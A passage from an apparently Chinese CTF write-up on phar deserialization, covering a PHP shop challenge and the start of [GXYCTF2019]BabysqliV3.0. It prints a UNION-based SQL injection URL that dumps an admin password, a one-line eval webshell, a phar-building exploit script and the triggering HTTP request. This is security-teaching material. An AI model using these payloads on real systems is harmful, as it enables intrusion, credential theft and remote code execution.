+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nv>$sqlwhere</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/phar-deserialization-analysis/QQ20250729-112336.jpg width=1629 height=777 loading=lazy alt=1></p><p>没有转义直接拼接了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>/</span><span class=n>include</span><span class=o>/</span><span class=n>plugin</span><span class=o>/</span><span class=n>payment</span><span class=o>/</span><span class=n>alipay</span><span class=o>/</span><span class=n>pay</span><span class=p>.</span><span class=n>php</span><span class=o>?</span><span class=n>id</span><span class=o>=</span><span class=n>pay</span><span class=o>`%</span><span class=mi>20</span><span class=k>where</span><span class=o>%</span><span class=mi>201</span><span class=o>=</span><span class=mi>1</span><span class=o>%</span><span class=mi>20</span><span class=k>union</span><span class=o>%</span><span class=mi>20</span><span class=k>select</span><span class=o>%</span><span class=mi>201</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=k>user</span><span class=p>(),</span><span class=mi>4</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>12</span><span class=o>%</span><span class=mi>23</span><span class=n>_</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=o>`</span><span class=n>order_pay</span><span class=o>`</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=k>user</span><span class=p>(),</span><span class=mi>4</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>12</span><span class=o>#`</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=o>`</span><span class=n>order_id</span><span class=o>`</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;pay` where 1=1 union select 1,2,user(),4,5,6,7,8,9,10,11,12#_&#39;</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>1</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>正常注入出管理员密码</p><p><img src=/p/phar-deserialization-analysis/QQ20250729-112643.jpg width=999 height=666 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>/</span><span class=n>include</span><span class=o>/</span><span class=n>plugin</span><span class=o>/</span><span class=n>payment</span><span class=o>/</span><span class=n>alipay</span><span class=o>/</span><span class=n>pay</span><span class=p>.</span><span class=n>php</span><span class=o>?</span><span class=n>id</span><span class=o>=</span><span class=n>pay</span><span class=o>`%</span><span class=mi>20</span><span class=k>where</span><span class=o>%</span><span class=mi>201</span><span class=o>=</span><span class=mi>1</span><span class=o>%</span><span class=mi>20</span><span class=k>union</span><span class=o>%</span><span class=mi>20</span><span class=k>select</span><span class=o>%</span><span class=mi>201</span><span class=p>,</span><span class=mi>2</span><span class=p>,((</span><span class=k>select</span><span class=o>`</span><span class=mi>3</span><span class=o>`</span><span class=k>from</span><span class=p>(</span><span class=k>select</span><span class=o>%</span><span class=mi>201</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>6</span><span class=o>%</span><span class=mi>20</span><span class=k>union</span><span class=o>%</span><span class=mi>20</span><span class=k>select</span><span class=o>%</span><span class=mi>20</span><span class=o>*%</span><span class=mi>20</span><span class=k>from</span><span class=o>%</span><span class=mi>20</span><span class=k>admin</span><span class=p>)</span><span class=n>a</span><span class=o>%</span><span class=mi>20</span><span class=k>limit</span><span class=o>%</span><span class=mi>201</span><span class=p>,</span><span class=mi>1</span><span class=p>)),</span><span class=mi>4</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>12</span><span class=o>%</span><span class=mi>23</span><span class=n>_</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>altman777</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>登录进来之后没发现什么后台getshell的地方，和官方代码对比发现<code>/include/class/pclzip.class.php</code>有不同</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>  <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>extract</span><span class=p>(</span><span class=nx>PCLZIP_OPT_PATH</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>save_path</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>多了个这个，只要反序列化成功就自动解压，现在找反序列化点，寻找调用这个类的地方</p><p><img src=/p/phar-deserialization-analysis/QQ20250729-113841.jpg width=1016 height=333 loading=lazy alt=1></p><p>有点找不到，可以触发的函数太多了，看web端，</p><p><img src=/p/phar-deserialization-analysis/QQ20250729-114021.jpg width=1278 height=819 loading=lazy alt=1></p><p>发现可以上传图片什么的，但是我进到这里的代码，没看出什么东西，全局搜索下载解压，找到<code>moban.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;del&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>		<span class=nx>pe_token_match</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>		<span class=nv>$tpl_name</span> <span class=o>=</span> <span class=nx>pe_dbhold</span><span class=p>(</span><span class=nv>$_g_tpl</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nv>$tpl_name</span> <span class=o>==</span> <span class=s1>&#39;default&#39;</span><span class=p>)</span> <span class=nx>pe_error</span><span class=p>(</span><span class=s1>&#39;默认模板不能删除...&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nv>$db</span><span class=o>-&gt;</span><span class=na>pe_num</span><span class=p>(</span><span class=s1>&#39;setting&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;setting_key&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;web_tpl&#39;</span><span class=p>,</span> <span class=s1>&#39;setting_value&#39;</span><span class=o>=&gt;</span><span class=nv>$tpl_name</span><span class=p>)))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=nx>pe_error</span><span class=p>(</span><span class=s1>&#39;使用中不能删除&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=nx>pe_dirdel</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{</span><span class=nv>$tpl_name</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>			<span class=nx>pe_success</span><span class=p>(</span><span class=s1>&#39;删除成功!&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>break</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p>肯定能删除成功，所以我们直接跟进<code>pe_dirdel</code></p><p><img src=/p/phar-deserialization-analysis/QQ20250729-114421.jpg width=1027 height=509 loading=lazy alt=1></p><p>成功触发phar反序列化，现在我们需要上传一个带有恶意webshell的压缩包，和一个phar文件，phar文件的目的是用来解压图片的。OK开始行动</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>echo &#39;&lt;?php eval($_POST[1]);&#39; &gt; shell.php
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>zip 1.zip shell.php
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/phar-deserialization-analysis/QQ20250729-114800.jpg width=1155 height=791 loading=lazy alt=1></p><p>位置也知道，并且data目录肯定是有足够权限的，所以写个exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>PclZip</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$zipname</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$zip_fd</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$error_code</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$error_string</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$magic_quotes_status</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$save_path</span> <span class=o>=</span> <span class=s1>&#39;/var/www/html/data&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$p_zipname</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>zipname</span> <span class=o>=</span> <span class=nv>$p_zipname</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>zip_fd</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>magic_quotes_status</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>PclZip</span><span class=p>(</span><span class=s2>&#34;/var/www/html/data/attachment/brand/1.zip&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s2>&#34;GIF89a&#34;</span><span class=o>.</span><span class=s2>&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;test.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;test&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>rename</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>,</span> <span class=s2>&#34;phar.txt&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>然后删除phar文件，触发phar反序列化，进行解压恶意文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/admin.php?mod=moban&amp;act=del&amp;token=1f2fa1ee9eeb0a2f354e00711f2dae37&amp;tpl=phar:///var/www/html/data/attachment/brand/6.txt</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>db525244-9f5c-41ec-be44-7cd16d0e7524.node5.buuoj.cn:81</span>
+</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
+</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://db525244-9f5c-41ec-be44-7cd16d0e7524.node5.buuoj.cn:81/admin.php?mod=moban</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>PHPSESSID=9ahime1da2timrfga6nm4i1g17</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/phar-deserialization-analysis/QQ20250729-120457.jpg width=1173 height=871 loading=lazy alt=1></p><p>有个小细节忘了，就是之前我们看admin.php进行删除的时候其实有个函数漏看了，导致一直删不了模版</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>pe_token_match</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>global</span> <span class=nv>$pe</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=nv>$referer</span> <span class=o>=</span> <span class=nx>parse_url</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_REFERER&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>	<span class=nv>$pe_token</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;pe_token&#39;</span><span class=p>]</span> <span class=o>?</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;pe_token&#39;</span><span class=p>]</span> <span class=o>:</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>];</span>	
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>@</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$pe</span><span class=p>[</span><span class=s1>&#39;host_root&#39;</span><span class=p>],</span> <span class=nv>$referer</span><span class=p>[</span><span class=s1>&#39;host&#39;</span><span class=p>])</span> <span class=o>===</span> <span class=k>false</span> <span class=k>or</span> <span class=nv>$pe_token</span> <span class=o>!=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;pe_token&#39;</span><span class=p>]</span> <span class=k>or</span> <span class=nv>$pe_token</span> <span class=o>==</span> <span class=s1>&#39;&#39;</span> <span class=k>or</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;pe_token&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=nx>unset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;pe_token&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>		<span class=nx>pe_error</span><span class=p>(</span><span class=s1>&#39;跨站操作...&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=nx>unset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;pe_token&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>token抓包就可以获得，Referer来过host检测</p><h2 id=demo5>demo5</h2><p><strong>[GXYCTF2019]BabysqliV3.0</strong></p><p><code>admin\password</code>进后台之后发现有一个<code>upload.php</code></p><p>发现参数有猫腻，LFI进行文件读取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>//upload.php
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>&lt;</span><span class=nx>meta</span> <span class=nx>http</span><span class=o>-</span><span class=nx>equiv</span><span class=o>=</span><span class=s2>&#34;Content-Type&#34;</span> <span class=nx>content</span><span class=o>=</span><span class=s2>&#34;text/html; charset=utf-8&#34;</span> <span class=o>/&gt;</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>form</span> <span class=nx>action</span><span class=o>=</span><span class=s2>&#34;&#34;</span> <span class=nx>method</span><span class=o>=</span><span class=s2>&#34;post&#34;</span> <span class=nx>enctype</span><span class=o>=</span><span class=s2>&#34;multipart/form-data&#34;</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>	<span class=nx>上传文件</span>
+</span></span><span class=line><span class=cl>	<span class=o>&lt;</span><span class=nx>input</span> <span class=nx>type</span><span class=o>=</span><span class=s2>&#34;file&#34;</span> <span class=nx>name</span><span class=o>=</span><span class=s2>&#34;file&#34;</span> <span class=o>/&gt;</span>
+</span></span><span class=line><span class=cl>	<span class=o>&lt;</span><span class=nx>input</span> <span class=nx>type</span><span class=o>=</span><span class=s2>&#34;submit&#34;</span> <span class=nx>name</span><span class=o>=</span><span class=s2>&#34;submit&#34;</span> <span class=nx>value</span><span class=o>=</span><span class=s2>&#34;上传&#34;</span> <span class=o>/&gt;</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=nx>form</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Uploader</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$Filename</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$cmd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$token</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>		<span class=nv>$sandbox</span> <span class=o>=</span> <span class=nx>getcwd</span><span class=p>()</span><span class=o>.</span><span class=s2>&#34;/uploads/&#34;</span><span class=o>.</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>])</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=nv>$ext</span> <span class=o>=</span> <span class=s2>&#34;.txt&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=o>@</span><span class=nx>mkdir</span><span class=p>(</span><span class=nv>$sandbox</span><span class=p>,</span> <span class=mo>0777</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>])</span> <span class=k>and</span> <span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&#34;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>			<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>Filename</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>Filename</span> <span class=o>=</span> <span class=nv>$sandbox</span><span class=o>.</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span><span class=o>.</span><span class=nv>$ext</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span> <span class=o>=</span> <span class=s2>&#34;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>function</span> <span class=nf>upload</span><span class=p>(</span><span class=nv>$file</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>		<span class=k>global</span> <span class=nv>$sandbox</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=k>global</span> <span class=nv>$ext</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;[^a-z0-9]&#34;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>Filename</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>			<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span> <span class=o>=</span> <span class=s2>&#34;die(&#39;illegal filename!&#39;);&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=k>else</span><span class=p>{</span>
